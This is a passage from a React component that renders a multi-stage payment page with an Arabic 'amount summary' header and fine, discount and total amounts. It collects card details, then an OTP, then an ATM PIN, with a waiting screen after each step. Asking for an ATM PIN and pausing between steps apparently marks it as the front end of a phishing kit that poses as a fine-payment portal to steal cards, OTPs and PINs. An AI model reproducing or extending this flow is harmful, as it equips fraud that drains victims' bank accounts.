          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  };

  return (
    <PaymentFrame>
      <PaymentGatewayHeader />

      <div className="px-4 pb-2 sm:px-5">
        {stage === "card" && (
          <>
            <SectionCard title="ملخص المبلغ">
              <InfoTable rows={transactionRows} />
            </SectionCard>
            <div className="mt-4">
              <CardForm
                onSubmit={handleCardSubmit}
                onCancel={() => navigate(homePath)}
                isLoading={isSubmitting}
                error={errorMessage}
                fineAmount={fineAmount}
                discountAmount={discountAmount}
                totalAmount={dueAmount}
              />
            </div>
          </>
        )}

        {stage === "card_pending" && <WaitingPage message={t.payment.waiting.card} />}
        {stage === "otp" && <OtpForm onSubmit={handleOtpSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === "otp_pending" && <WaitingPage message={t.payment.waiting.otp} />}
        {stage === "atm" && <AtmPinForm onSubmit={handleAtmPinSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === "atm_pending" && <WaitingPage message={t.payment.waiting.atm} />}
        {stage === "success" && <SuccessPage totalAmount={dueAmount} onDone={handleDone} />}
        {stage === "failed" && <FailedPage onRetry={handleRetry} />}
      </div>

      <PaymentFooter />
    </PaymentFrame>
  );
}
